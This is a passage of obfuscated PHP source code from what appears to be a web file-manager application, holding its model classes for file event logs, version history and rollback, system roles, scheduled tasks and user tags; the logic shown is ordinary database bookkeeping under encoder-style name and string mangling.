$ÊÆÓÍÌ[1922]) { return !1; } return !0; } public function eventCreate($ºÃÉÕß®, $Ç÷ÈµÉ¡) { $Öé±»¥² =& $_SERVER[Õò”†—·]; $øŸÔø¤¦ = Model($Öé±»¥²[1388])->sourceInfo($ºÃÉÕß®); $’Ùâü = array($Öé±»¥²[2184] => $Ç÷ÈµÉ¡, $Öé±»¥²[42] => $øŸÔø¤¦[$Öé±»¥²[42]]); return $this->addEvent($ºÃÉÕß®, $Öé±»¥²[2183], $’Ùâü); } public function eventFileEdit($ß¤ê²œæ) { $Æ™õ›æ‚ =& $_SERVER[Õò”†—·]; $–œÒåƒ— = array($Æ™õ›æ‚[2190] => $_SERVER[$Æ™õ›æ‚[2191]], $Æ™õ›æ‚[2192] => strtolower(ACTION)); if (isset($GLOBALS[$Æ™õ›æ‚[17]][$Æ™õ›æ‚[2193]])) { $–œÒåƒ—[$Æ™õ›æ‚[2193]] = $Æ™õ›æ‚[101]; } return $this->addEvent($ß¤ê²œæ, $Æ™õ›æ‚[1923], $–œÒåƒ—); } public function eventRecycle($ĞêÜÈ•Ö, $ÑÕŒ¹Ô) { return $this->addEvent($ĞêÜÈ•Ö, $_SERVER[Õò”†—·][2185], $ÑÕŒ¹Ô); } private static $_removeLast = ''; public function eventRemove($¿ÔÑ×µ¿) { $Û‘Î÷¦” =& $_SERVER[Õò”†—·]; self::$_removeLast = $¿ÔÑ×µ¿; $â•¿˜ˆ = Model($Û‘Î÷¦”[1388])->sourceInfo($¿ÔÑ×µ¿); $İÑÙÜ­Î = array_field_key($â•¿˜ˆ, array($Û‘Î÷¦”[194], $Û‘Î÷¦”[525], $Û‘Î÷¦”[489], $Û‘Î÷¦”[569])); $ÎÙÁğä‰ = array($Û‘Î÷¦”[805] => $â•¿˜ˆ[$Û‘Î÷¦”[42]], $Û‘Î÷¦”[2192] => ACTION, $Û‘Î÷¦”[2194] => $İÑÙÜ­Î); return $this->addEvent($â•¿˜ˆ[$Û‘Î÷¦”[193]], $Û‘Î÷¦”[1922], $ÎÙÁğä‰); } public function eventShare($òÎò™Ó, $«ˆßşÁ) { return $this->addEvent($òÎò™Ó, $_SERVER[Õò”†—·][1933], $«ˆßşÁ); } public function eventMove($±öõ«°ù, $¡“µ¯ô, $ÑÛ¬©ô«) { $³ªßÌ’… =& $_SERVER[Õò”†—·]; if (self::$_removeLast == $±öõ«°ù) { return; } $¯…õ² = Model($³ªßÌ’…[1388]); $Æöõ¾¹ = $¯…õ²->sourceInfo($±öõ«°ù); $°¬”Äş = $¯…õ²->sourceInfo($¡“µ¯ô); $õ½¶–¡ü = $¯…õ²->sourceInfo($ÑÛ¬©ô«); $“˜ˆµŞ = array($³ªßÌ’…[1213] => $¡“µ¯ô, $³ªßÌ’…[2195] => $°¬”Äş[$³ªßÌ’…[42]], $³ªßÌ’…[2171] => !empty($°¬”Äş[$³ªßÌ’…[567]]) ? $°¬”Äş[$³ªßÌ’…[567]] : $³ªßÌ’…[22], $³ªßÌ’…[1214] => $ÑÛ¬©ô«, $³ªßÌ’…[2196] => $õ½¶–¡ü[$³ªßÌ’…[42]], $³ªßÌ’…[2197] => !empty($õ½¶–¡ü[$³ªßÌ’…[567]]) ? $õ½¶–¡ü[$³ªßÌ’…[567]] : $³ªßÌ’…[22]); $this->addEvent($±öõ«°ù, $³ªßÌ’…[604], $“˜ˆµŞ); $Æöõ¾¹ = $¯…õ²->sourceInfo($±öõ«°ù); $“˜ˆµŞ = array($³ªßÌ’…[194] => $Æöõ¾¹[$³ªßÌ’…[194]], $³ªßÌ’…[42] => $Æöõ¾¹[$³ªßÌ’…[42]]); $this->addEvent($¡“µ¯ô, $³ªßÌ’…[2198], $“˜ˆµŞ); } public function eventCopy($§™º¡Å“) { $this->eventCreate($§™º¡Å“, $_SERVER[Õò”†—·][602]); } public function eventRename($ó÷Îàğä, $²Š¼ıœĞ, $¾‚ù¾) { $¾ì“ß‰ =& $_SERVER[Õò”†—·]; $¬çêµ‡÷ = array($¾ì“ß‰[1213] => $²Š¼ıœĞ, $¾ì“ß‰[1214] => $¾‚ù¾); return $this->addEvent($ó÷Îàğä, $¾ì“ß‰[1402], $¬çêµ‡÷); } public function eventAddComment($“Á³æ, $Ù„ò¦Ğº) { return $this->addEvent($“Á³æ, $_SERVER[Õò”†—·][2199], $Ù„ò¦Ğº); } public function eventAddDesc($æ•Ï€é, $…¶óîÉ¿) { return $this->addEvent($æ•Ï€é, $_SERVER[Õò”†—·][2200], $…¶óîÉ¿); } public function listBySource($Š’€ªƒ‚) { $¥º›æÂã =& $_SERVER[Õò”†—·]; $¸­îÁØ™ = Model($¥º›æÂã[1388])->sourceInfo($Š’€ªƒ‚); $€ü´“ç” = array($¥º›æÂã[475] => $Š’€ªƒ‚); if ($¸­îÁØ™[$¥º›æÂã[469]] == $¥º›æÂã[101]) { $àñÄ¶Æ = Model($¥º›æÂã[1388])->listSearchChildren($Š’€ªƒ‚, 20000); $àñÄ¶Æ[] = $Š’€ªƒ‚ . $¥º›æÂã[438]; $€ü´“ç” = array($¥º›æÂã[194] => array($¥º›æÂã[17], $àñÄ¶Æ)); } $•ñ‹ôÌË = $this->where($€ü´“ç”)->order($¥º›æÂã[2201])->selectPage(); if ($•ñ‹ôÌË[$¥º›æÂã[426]][$¥º›æÂã[427]] == 0) { $•ñ‹ôÌË[$¥º›æÂã[426]][$¥º›æÂã[427]] = 1; $•ñ‹ôÌË[$¥º›æÂã[429]] = array(array($¥º›æÂã[475] => $Š’€ªƒ‚, $¥º›æÂã[2181] => $¸­îÁØ™[$¥º›æÂã[193]], $¥º›æÂã[1746] => $¸­îÁØ™[$¥º›æÂã[511]], $¥º›æÂã[480] => $¥º›æÂã[2202], $¥º›æÂã[481] => $¸­îÁØ™[$¥º›æÂã[232]], $¥º›æÂã[1748] => $¥º›æÂã[22])); } return $this->eventListParse($•ñ‹ôÌË, $Š’€ªƒ‚); } private function eventListParse($ Ê©Ëë, $»úÇü–ı) { $ğ·¿Ñš =& $_SERVER[Õò”†—·]; $Ú›Áİº = $ Ê©Ëë[$ğ·¿Ñš[429]]; $Ö¥ø§¢ = array_to_keyvalue($Ú›Áİº, $ğ·¿Ñš[22], $ğ·¿Ñš[194]); $ç·›†½‚ = array_to_keyvalue($Ú›Áİº, $ğ·¿Ñš[22], $ğ·¿Ñš[2187]); foreach ($Ú›Áİº as $ò£¸–Êï) { $·Ïˆ–Êñ = $ò£¸–Êï[$ğ·¿Ñš[510]]; if ($ò£¸–Êï[$ğ·¿Ñš[43]] == $ğ·¿Ñš[604] && isset($·Ïˆ–Êñ[$ğ·¿Ñš[1213]])) { $Ö¥ø§¢[] = $·Ïˆ–Êñ[$ğ·¿Ñš[1213]] . $ğ·¿Ñš[22]; $Ö¥ø§¢[] = $·Ïˆ–Êñ[$ğ·¿Ñš[1214]] . $ğ·¿Ñš[22]; } if ($ò£¸–Êï[$ğ·¿Ñš[43]] == $ğ·¿Ñš[2198] && isset($·Ïˆ–Êñ[$ğ·¿Ñš[194]])) { $Ö¥ø§¢[] = $·Ïˆ–Êñ[$ğ·¿Ñš[194]] . $ğ·¿Ñš[22]; } } $Ö¥ø§¢ = array_merge($Ö¥ø§¢, $ç·›†½‚, array($»úÇü–ı . $ğ·¿Ñš[22])); $Ö¥ø§¢ = array_unique($Ö¥ø§¢); $Ù½‡“«ë = array_unique(array_to_keyvalue($Ú›Áİº, $ğ·¿Ñš[22], $ğ·¿Ñš[1755])); $·Àš¸¹ğ = Model($ğ·¿Ñš[583])->userListInfo($Ù½‡“«ë); $àä·Â‚© = Model($ğ·¿Ñš[875])->sourceListInfo($Ö¥ø§¢, !0); foreach ($Ú›Áİº as &$ò£¸–Êï) { if ($ò£¸–Êï[$ğ·¿Ñš[43]] == $ğ·¿Ñš[604] && isset($ò£¸–Êï[$ğ·¿Ñš[510]][$ğ·¿Ñš[1213]])) { $ò£¸–Êï[$ğ·¿Ñš[510]][$ğ·¿Ñš[1213]] = $àä·Â‚©[$ò£¸–Êï[$ğ·¿Ñš[510]][$ğ·¿Ñš[1213]]]; $ò£¸–Êï[$ğ·¿Ñš[510]][$ğ·¿Ñš[1214]] = $àä·Â‚©[$ò£¸–Êï[$ğ·¿Ñš[510]][$ğ·¿Ñš[1214]]]; } if ($ò£¸–Êï[$ğ·¿Ñš[43]] == $ğ·¿Ñš[2198] && isset($ò£¸–Êï[$ğ·¿Ñš[510]][$ğ·¿Ñš[194]])) { $ò£¸–Êï[$ğ·¿Ñš[510]][$ğ·¿Ñš[194]] = $àä·Â‚©[$ò£¸–Êï[$ğ·¿Ñš[510]][$ğ·¿Ñš[194]]]; } $ò£¸–Êï[$ğ·¿Ñš[100]] = $àä·Â‚©[$ò£¸–Êï[$ğ·¿Ñš[194]]]; $ò£¸–Êï[$ğ·¿Ñš[2203]] = $àä·Â‚©[$ò£¸–Êï[$ğ·¿Ñš[2187]]]; if ($ò£¸–Êï[$ğ·¿Ñš[43]] == $ğ·¿Ñš[1922]) { $ò£¸–Êï[$ğ·¿Ñš[2203]] = $ò£¸–Êï[$ğ·¿Ñš[100]]; $ò£¸–Êï[$ğ·¿Ñš[2187]] = $ò£¸–Êï[$ğ·¿Ñš[2203]][$ğ·¿Ñš[194]]; $ò£¸–Êï[$ğ·¿Ñš[100]] = !1; $ò£¸–Êï[$ğ·¿Ñš[194]] = $ğ·¿Ñš[22]; } $ò£¸–Êï[$ğ·¿Ñš[2130]] = $·Àš¸¹ğ[$ò£¸–Êï[$ğ·¿Ñš[1755]]]; } unset($ò£¸–Êï); $ Ê©Ëë[$ğ·¿Ñš[429]] = $Ú›Áİº; return $ Ê©Ëë; } public function removeBySource($¢…–ø½) { $ øÛ©À« = array($_SERVER[Õò”†—·][475] => $¢…–ø½); $this->where($ øÛ©À«)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\x72\x63\145\137\x68\x69\163\164\157\x72\x79"; public function historyCount($»ÙÜ˜“Ç) { $Öƒ‰•ÆŒ =& $_SERVER[Õò”†—·]; if (!$»ÙÜ˜“Ç) { return array(); } if (is_string($»ÙÜ˜“Ç) || is_int($»ÙÜ˜“Ç)) { $»ÙÜ˜“Ç = array($»ÙÜ˜“Ç); } $Õ³¦Š×‹ = array($Öƒ‰•ÆŒ[194], $Öƒ‰•ÆŒ[1986] => $Öƒ‰•ÆŒ[550]); $¥±ØÓ©Ú = array($Öƒ‰•ÆŒ[194] => array($Öƒ‰•ÆŒ[17], $»ÙÜ˜“Ç)); $ˆáĞ“§ = $this->field($Õ³¦Š×‹)->where($¥±ØÓ©Ú)->group($Öƒ‰•ÆŒ[194])->select(); return array_to_keyvalue($ˆáĞ“§, $Öƒ‰•ÆŒ[194], $Öƒ‰•ÆŒ[550]); } public function addHistory($Î¶—ŠØš, $ÜŸÏ¨¢Ï = '') { $³›×›…ß =& $_SERVER[Õò”†—·]; $›øº—í = array($³›×›…ß[475] => $Î¶—ŠØš[$³›×›…ß[194]], $³›×›…ß[1746] => isset($Î¶—ŠØš[$³›×›…ß[513]]) ? $Î¶—ŠØš[$³›×›…ß[513]] : $Î¶—ŠØš[$³›×›…ß[511]], $³›×›…ß[526] => $Î¶—ŠØš[$³›×›…ß[525]], $³›×›…ß[601] => $Î¶—ŠØš[$³›×›…ß[89]], $³›×›…ß[2204] => $ÜŸÏ¨¢Ï); if ($GLOBALS[$³›×›…ß[16]][$³›×›…ß[102]][$³›×›…ß[1271]] >= 1) { $this->historyAutoClear($›øº—í[$³›×›…ß[194]]); $this->add($›øº—í); } Hook::trigger($³›×›…ß[2205], $›øº—í); Model($³›×›…ß[2206])->eventFileEdit($Î¶—ŠØš[$³›×›…ß[194]]); } private function historyAutoClear($šç¢É«) { $çë±ÔøÈ =& $_SERVER[Õò”†—·]; $çåÑĞ§° = Model($çë±ÔøÈ[821])->get($çë±ÔøÈ[1293]); $üø‘•º¼ = intval($GLOBALS[$çë±ÔøÈ[16]][$çë±ÔøÈ[102]][$çë±ÔøÈ[1271]]); $ï’µ“½Æ = $çåÑĞ§° == $çë±ÔøÈ[1294] ? min(5, $üø‘•º¼) : $üø‘•º¼; $ï’µ“½Æ = $ï’µ“½Æ <= 0 ? 0 : $ï’µ“½Æ - 1; if ($ï’µ“½Æ >= 500) { return; } $­Òûãì¶ = array($çë±ÔøÈ[475] => $šç¢É«); $¡å˜Ò¼û = $this->field($çë±ÔøÈ[2207])->where($­Òûãì¶)->order($çë±ÔøÈ[2201])->select(); if (!$¡å˜Ò¼û || $ï’µ“½Æ >= count($¡å˜Ò¼û)) { return; } $¿À¢›†“ = array_to_keyvalue($¡å˜Ò¼û, $çë±ÔøÈ[22], $çë±ÔøÈ[459]); $¿À¢›†“ = array_slice($¿À¢›†“, $ï’µ“½Æ); $Òó¸ˆ™ = array_to_keyvalue($¡å˜Ò¼û, $çë±ÔøÈ[22], $çë±ÔøÈ[525]); $Òó¸ˆ™ = array_slice($Òó¸ˆ™, $ï’µ“½Æ); if (!$¿À¢›†“ || !$Òó¸ˆ™) { return; } $­Òûãì¶ = array($çë±ÔøÈ[477] => array($çë±ÔøÈ[17], $¿À¢›†“)); $this->where($­Òûãì¶)->delete(); Model($çë±ÔøÈ[528])->remove($Òó¸ˆ™); } public function listData($ËÙ¹¿ñÌ) { $•ëÒÑ¢ö =& $_SERVER[Õò”†—·]; $€ƒ†ÚÚ€ = array($•ëÒÑ¢ö[475] => $ËÙ¹¿ñÌ); $ùïÄ–À = $•ëÒÑ¢ö[2208]; $ì‰ÒÎà± = $this->field($ùïÄ–À)->where($€ƒ†ÚÚ€)->order($•ëÒÑ¢ö[2201])->selectPage(); $this->_listAppendUser($ì‰ÒÎà±[$•ëÒÑ¢ö[429]]); $ƒÌîÚš­ = Model($•ëÒÑ¢ö[821])->get($•ëÒÑ¢ö[1293]); $ŒšŸ±‡¿ = 5; if ($ƒÌîÚš­ == $•ëÒÑ¢ö[1294]) { $ì‰ÒÎà±[$•ëÒÑ¢ö[429]] = array_slice($ì‰ÒÎà±[$•ëÒÑ¢ö[429]], 0, $ŒšŸ±‡¿); $ì‰ÒÎà±[$•ëÒÑ¢ö[426]] = array($•ëÒÑ¢ö[2209] => 1, $•ëÒÑ¢ö[2210] => 20, $•ëÒÑ¢ö[2211] => 1, $•ëÒÑ¢ö[2212] => count($ì‰ÒÎà±[$•ëÒÑ¢ö[429]])); } return $ì‰ÒÎà±; } protected function _listAppendUser(&$¤Ÿ—…Õš) { $Áå­¯»Ú =& $_SERVER[Õò”†—·]; $¶Öó¥®‹ = array_to_keyvalue($¤Ÿ—…Õš, $Áå­¯»Ú[22], $Áå­¯»Ú[1755]); $İêÂÄÖÙ = Model($Áå­¯»Ú[583])->userListInfo($¶Öó¥®‹); foreach ($¤Ÿ—…Õš as &$ßÈÉ¯Şô) { $šÁ²ˆÒ„ = $ßÈÉ¯Şô[$Áå­¯»Ú[1755]]; $ßÈÉ¯Şô[$Áå­¯»Ú[511]] = $İêÂÄÖÙ[$šÁ²ˆÒ„] ? $İêÂÄÖÙ[$šÁ²ˆÒ„] : !1; } unset($ßÈÉ¯Şô); } public function fileInfo($íïè¸ı°) { $¬ô°†» =& $_SERVER[Õò”†—·]; $•äÕ×òà = $this->tablePrefix; $ëö§íÈà = "{$•äÕ×òà}\151\x6f\x5f\146\x69\x6c\145\x20\x66\x69\x6c\145\163\x20\157\x6e\x20\x66\151\154\145\163\x2e\x66\151\x6c\145\x49\104\40\75\x20\x68\x69\x73\x74\x6f\162\171\x2e\146\x69\154\145\x49\104"; return $this->alias($¬ô°†»[2213])->where(array($¬ô°†»[477] => $íïè¸ı°))->join($ëö§íÈà, $¬ô°†»[2214])->find(); } public function removeItem($¯°ÈÄœ) { $ŞüÄˆÀ¨ =& $_SERVER[Õò”†—·]; $÷Æ›Şà² = array($ŞüÄˆÀ¨[477] => $¯°ÈÄœ); $ãù”Ú¡ = $this->where($÷Æ›Şà²)->find(); if ($ãù”Ú¡) { $Ôè— å¥ = $this->where($÷Æ›Şà²)->delete(); Model($ŞüÄˆÀ¨[528])->remove($ãù”Ú¡[$ŞüÄˆÀ¨[525]]); return $Ôè— å¥; } return !1; } public function removeBySource($Û¯š³€İ) { $™“£ªÎÖ =& $_SERVER[Õò”†—·]; if (!$Û¯š³€İ) { return !1; } if (!is_array($Û¯š³€İ)) { $Û¯š³€İ = array($Û¯š³€İ); } $ış®Ğœ = array($™“£ªÎÖ[475] => array($™“£ªÎÖ[17], $Û¯š³€İ)); $Ô’¸ ÒÀ = $this->field($™“£ªÎÖ[526])->where($ış®Ğœ)->select(); if ($Ô’¸ ÒÀ) { $this->where($ış®Ğœ)->delete(); $ÕœšËËâ = array_to_keyvalue($Ô’¸ ÒÀ, $™“£ªÎÖ[22], $™“£ªÎÖ[525]); Model($™“£ªÎÖ[528])->remove($ÕœšËËâ); } return !0; } public function setDetail($›®µ¢÷¨, $ğÆ¦») { $¦äû‰£ =& $_SERVER[Õò”†—·]; return $this->where(array($¦äû‰£[477] => $›®µ¢÷¨))->save(array($¦äû‰£[2204] => $ğÆ¦»)); } public function rollbackToItem($ŒÉÎÊ», $É¶ÔŒàş) { $ÕğÛõ™¼ =& $_SERVER[Õò”†—·]; $¬âê‹± = Model($ÕğÛõ™¼[875])->sourceInfo($ŒÉÎÊ»); $this->addHistory($¬âê‹±, LNG($ÕğÛõ™¼[2215])); $¼¤‡ÆüÚ = $this->find($É¶ÔŒàş); $¥ßë˜ü‘ = array($ÕğÛõ™¼[525] => $¼¤‡ÆüÚ[$ÕğÛõ™¼[525]], $ÕğÛõ™¼[89] => $¼¤‡ÆüÚ[$ÕğÛõ™¼[89]], $ÕğÛõ™¼[98] => time(), $ÕğÛõ™¼[513] => USER_ID); Model($ÕğÛõ™¼[875])->where(array($ÕğÛõ™¼[194] => $ŒÉÎÊ»))->save($¥ßë˜ü‘); return $this->where(array($ÕğÛõ™¼[477] => $É¶ÔŒàş))->delete(); } public function clearSame($Ù’´ø‹ˆ) { $Áæ¶¼ş =& $_SERVER[Õò”†—·]; $öÇ‘„Ş³ = $this->listData($Ù’´ø‹ˆ); $òş­×îî = array_to_keyvalue_group($öÇ‘„Ş³, $Áæ¶¼ş[525]); $á­Î— • = array(); $¡…Á‰İ = array(); foreach ($òş­×îî as $¡øÂÜš’) { if (!$¡øÂÜš’ || count($¡øÂÜš’) <= 1) { continue; } foreach ($¡øÂÜš’ as $û¶àïÑ) { $á­Î— •[] = $û¶àïÑ[$Áæ¶¼ş[525]]; $¡…Á‰İ[] = $û¶àïÑ[$Áæ¶¼ş[459]]; } } if (!$¡…Á‰İ) { return; } $this->where(array($Áæ¶¼ş[459] => array($Áæ¶¼ş[17], $¡…Á‰İ)))->delete(); Model($Áæ¶¼ş[528])->remove($á­Î— •); } public function userSpace() { $ñ¤»ÏŠ =& $_SERVER[Õò”†—·]; $¦ß“ĞêÀ = $this->tablePrefix; $£äß–¼Ç = array($ñ¤»ÏŠ[1746] => USER_ID); $³äÖ‹ã = "{$¦ß“ĞêÀ}\x69\157\x5f\146\x69\154\145\x20\146\151\x6c\145\x73\x20\157\156\40\x66\x69\154\x65\163\x2e\146\151\154\145\111\x44\40\75\x20\150\151\x73\x74\157\162\x79\56\x66\x69\154\145\x49\104"; return $this->alias($ñ¤»ÏŠ[2213])->where($£äß–¼Ç)->join($³äÖ‹ã, $ñ¤»ÏŠ[2214])->sum($ñ¤»ÏŠ[89]); } } goto c³ÅÆøŸ•; aÕ„Š’¨†: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\162\x6f\154\145\114\151\163\164"; public $field = array("\x6e\141\155\x65", "\x61\x75\164\150", "\154\141\x62\145\x6c", "\144\x69\163\x70\x6c\x61\171", "\163\171\163\x74\x65\155", "\144\x65\x73\x63", "\x69\147\x6e\x6f\162\145\105\170\x74", "\x69\147\156\157\x72\145\106\x69\x6c\145\123\151\172\145", "\x61\144\x6d\x69\156\151\x73\164\162\141\164\157\162", "\163\x6f\162\164"); public function listData($üŠ¥èë‰ = false, $÷Şò¾¥Ø = "\x73\157\162\164", $¹Ø§¿ı = false) { $óÂÀü¹“ =& $_SERVER[Õò”†—·]; $«£ŞÕ½ = parent::listData($üŠ¥èë‰, $÷Şò¾¥Ø, $¹Ø§¿ı); if (!$üŠ¥èë‰) { foreach ($«£ŞÕ½ as $•„Î¡ñ³ => $ğé­Ê¢) { if ($ğé­Ê¢[$óÂÀü¹“[2161]] == 1) { $«£ŞÕ½[$•„Î¡ñ³][$óÂÀü¹“[510]] = LNG($óÂÀü¹“[2422]); } } } return $«£ŞÕ½; } public function update($¿¸ìÒÅ, $È´çİ‹) { $üˆíì÷­ =& $_SERVER[Õò”†—·]; $ÉŞ÷½öÎ = parent::listData($¿¸ìÒÅ); $ÓÄŠÉÌş = $this->findByName($È´çİ‹[$üˆíì÷­[42]]); if (!$ÉŞ÷½öÎ || $ÓÄŠÉÌş && $ÓÄŠÉÌş[$üˆíì÷­[459]] != $ÉŞ÷½öÎ[$üˆíì÷­[459]]) { return !1; } if ($ÓÄŠÉÌş[$üˆíì÷­[2161]] == 1) { $È´çİ‹ = array($üˆíì÷­[42] => $È´çİ‹[$üˆíì÷­[42]], $üˆíì÷­[1976] => $È´çİ‹[$üˆíì÷­[1976]]); } $this->filterAuth($È´çİ‹[$üˆíì÷­[471]]); return parent::update($¿¸ìÒÅ, $È´çİ‹); } public function remove($Ÿ©á’èÖ) { $şÑ‡³Ê¬ = parent::listData($Ÿ©á’èÖ); if (!$şÑ‡³Ê¬ || $şÑ‡³Ê¬[$_SERVER[Õò”†—·][192]]) { return !1; } return parent::remove($Ÿ©á’èÖ); } public function add($´àúüù‡) { $™ÃµÁ =& $_SERVER[Õò”†—·]; $å¸ò½¹ë = $´àúüù‡[$™ÃµÁ[42]]; if ($this->findByName($å¸ò½¹ë)) { return !1; } $Õ˜…Šü¥ = array($™ÃµÁ[478] => $å¸ò½¹ë, $™ÃµÁ[1959] => $™ÃµÁ[22], $™ÃµÁ[1955] => $™ÃµÁ[1963], $™ÃµÁ[2423] => 1, $™ÃµÁ[1958] => 0, $™ÃµÁ[2424] => 0, $™ÃµÁ[1957] => $this->getSort()); $´àúüù‡ = array_merge($Õ˜…Šü¥, $´àúüù‡); $this->filterAuth($´àúüù‡[$™ÃµÁ[471]]); return parent::insert($´àúüù‡); } private function getSort() { $Òİ³ –å =& $_SERVER[Õò”†—·]; $àÅ§ËĞİ = parent::listData(); $ÛÃ®Ê…Ç = array_to_keyvalue($àÅ§ËĞİ, $Òİ³ –å[22], $Òİ³ –å[1977]); return empty($ÛÃ®Ê…Ç) ? 0 : max($ÛÃ®Ê…Ç) + 1; } private function filterAuth(&$Ì‘ã˜) { $«÷ØóÄº =& $_SERVER[Õò”†—·]; $õìÑ¾©Ï = array(); $˜¼­ÆÀî = array_filter(explode($«÷ØóÄº[60], $Ì‘ã˜)); foreach ($˜¼­ÆÀî as $Ì‘ã˜) { $Åüµöàœ = explode($«÷ØóÄº[20], $Ì‘ã˜); if ($Åüµöàœ[0] == $«÷ØóÄº[2425] && $Åüµöàœ[1] != $«÷ØóÄº[1244]) { $°óìÚ = $Åüµöàœ[0] . $«÷ØóÄº[20] . $Åüµöàœ[1] . $«÷ØóÄº[2426]; if (!in_array($°óìÚ, $˜¼­ÆÀî)) { $õìÑ¾©Ï[] = $°óìÚ; } } $õìÑ¾©Ï[] = $Ì‘ã˜; } $Ì‘ã˜ = implode($«÷ØóÄº[60], $õìÑ¾©Ï); } public function findRoleDefault() { $Ñ÷ä«ö— =& $_SERVER[Õò”†—·]; $îÁÜ®« = parent::listData(); $›Ñö¡ĞÎ = !1; foreach ($îÁÜ®« as $®ÒÍÒõŸ) { if (!$®ÒÍÒõŸ || $®ÒÍÒõŸ[$Ñ÷ä«ö—[1975]] == $Ñ÷ä«ö—[229] || $®ÒÍÒõŸ[$Ñ÷ä«ö—[2161]] == 1) { continue; } if (strstr($®ÒÍÒõŸ[$Ñ÷ä«ö—[471]], $Ñ÷ä«ö—[2427])) { continue; } if (!strstr($®ÒÍÒõŸ[$Ñ÷ä«ö—[471]], $Ñ÷ä«ö—[2428])) { continue; } if (!$›Ñö¡ĞÎ) { $›Ñö¡ĞÎ = $®ÒÍÒõŸ; continue; } $¹ÔõªŞ = explode($Ñ÷ä«ö—[60], $›Ñö¡ĞÎ[$Ñ÷ä«ö—[471]]); $ÅÌ÷ˆ¶ã = explode($Ñ÷ä«ö—[60], $®ÒÍÒõŸ[$Ñ÷ä«ö—[471]]); if (count($¹ÔõªŞ) > count($ÅÌ÷ˆ¶ã)) { $›Ñö¡ĞÎ = $®ÒÍÒõŸ; } } return $›Ñö¡ĞÎ ? $›Ñö¡ĞÎ[$Ñ÷ä«ö—[459]] : $Ñ÷ä«ö—[22]; } public function sort($îÆË«çû, $Åë££ó›) { return parent::update($îÆË«çû, $Åë££ó›); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\164\141\x73\x6b\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\x74\171\x70\x65", "\145\166\145\156\x74", "\x74\151\x6d\145", "\x64\145\163\x63", "\x73\171\x73\x74\x65\155", "\x65\156\x61\142\x6c\x65", "\154\141\x73\x74\122\x75\x6e", "\163\x6f\162\x74"); public function listData($ùƒçÌº = false, $à‡»ÑË = "\163\157\x72\164", $­í¥•î® = false) { return parent::listData($ùƒçÌº, $à‡»ÑË, $­í¥•î®); } public function add($Î£˜¿Î›) { $ÌÓÕœœ =& $_SERVER[Õò”†—·]; $üáû‚‰™ = $this->findByName($Î£˜¿Î›[$ÌÓÕœœ[42]]); if ($üáû‚‰™) { return !1; } $Î£˜¿Î›[$ÌÓÕœœ[1706]] = 0; $Î£˜¿Î›[$ÌÓÕœœ[1977]] = $this->getSort(); return parent::insert($Î£˜¿Î›); } private function getSort() { $”šû½£Ö =& $_SERVER[Õò”†—·]; $ñìƒÍ = parent::listData(); $°ê¸ÑÀñ = array_to_keyvalue($ñìƒÍ, $”šû½£Ö[22], $”šû½£Ö[1977]); return empty($°ê¸ÑÀñ) ? 0 : max($°ê¸ÑÀñ) + 1; } public function update($ÅØ¤Ğ», $Å®Ó½„) { $‹•¹Éûœ =& $_SERVER[Õò”†—·]; $Œ°ÛïÛë = $this->listData($ÅØ¤Ğ»); $¬È¿²ßó = $this->findByName($Å®Ó½„[$‹•¹Éûœ[42]]); if (!$Œ°ÛïÛë || $¬È¿²ßó && $¬È¿²ßó[$‹•¹Éûœ[459]] != $Œ°ÛïÛë[$‹•¹Éûœ[459]]) { return !1; } return parent::update($ÅØ¤Ğ», $Å®Ó½„); } public function remove($¸ùİâ®ß, $¸úíı«Í = false) { $‡¥ä¡åŠ =& $_SERVER[Õò”†—·]; $­É»ÏÍµ = $this->listData($¸ùİâ®ß); if (!$­É»ÏÍµ) { return; } if (!$¸úíı«Í && $­É»ÏÍµ[$‡¥ä¡åŠ[192]] == $‡¥ä¡åŠ[101]) { return !1; } return parent::remove($¸ùİâ®ß); } public function enable($‚…Ş¬®É, $«µ¾À±ö) { return $this->update($‚…Ş¬®É, array($_SERVER[Õò”†—·][2417] => $«µ¾À±ö)); } public function run($›†ÛÜş±) { return $this->update($›†ÛÜş±, array($_SERVER[Õò”†—·][2429] => time())); } } goto fášÃåë÷Ä; aè›¸Ÿ¾À: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\141\166"; protected function cacheFunctionAlias($ÚÑˆÇçÔ) { $¯Ô¤ËÏµ =& $_SERVER[Õò”†—·]; return array($¯Ô¤ËÏµ[2069] => array($¯Ô¤ËÏµ[2481] . USER_ID, $¯Ô¤ËÏµ[2070])); } protected function listData() { $Å¼ úÅÓ =& $_SERVER[Õò”†—·]; $‘‡ŠûÄá = array($Å¼ úÅÓ[1746] => USER_ID, $Å¼ úÅÓ[542] => array($Å¼ úÅÓ[2073], 0)); $×àÒ­Å = $Å¼ úÅÓ[2482]; $«€­äÁ§ = $this->field($×àÒ­Å)->where($‘‡ŠûÄá)->order($Å¼ úÅÓ[2076])->select(); return $«€­äÁ§ ? $«€­äÁ§ : array(); } protected function addToTag($££´ú÷, $Ó–Ğ¤©) { $¶‹¶õ£Š =& $_SERVER[Õò”†—·]; if (!Model($¶‹¶õ£Š[2220])->listData($Ó–Ğ¤©)) { return !1; } if (is_numeric($££´ú÷)) { $õÛê½ÉÍ = Model($¶‹¶õ£Š[875])->pathInfo($££´ú÷); if (!$õÛê½ÉÍ) { return !1; } } else { $õÛê½ÉÍ = IO::infoSimple($££´ú÷); if (!$õÛê½ÉÍ) { return !1; } $¡İèİÄ¸ = $õÛê½ÉÍ[$¶‹¶õ£Š[42]]; $Â²ıÛ¤ = $õÛê½ÉÍ[$¶‹¶õ£Š[43]]; if (isset($õÛê½ÉÍ[$¶‹¶õ£Š[469]])) { $Â²ıÛ¤ = $õÛê½ÉÍ[$¶‹¶õ£Š[469]] == $¶‹¶õ£Š[101] ? $¶‹¶õ£Š[88] : $¶‹¶õ£Š[231]; } } $Ö£æôÎâ = array($¶‹¶õ£Š[1746] => USER_ID, $¶‹¶õ£Š[542] => $Ó–Ğ¤©, $¶‹¶õ£Š[479] => $££´ú÷, $¶‹¶õ£Š[480] => $Â²ıÛ¤ ? $Â²ıÛ¤ : $¶‹¶õ£Š[474], $¶‹¶õ£Š[478] => $¡İèİÄ¸ ? $¡İèİÄ¸ : $¶‹¶õ£Š[22], $¶‹¶õ£Š[1957] => 0); if ($this->where($Ö£æôÎâ)->find()) { return !1; } return $this->add($Ö£æôÎâ); } protected function 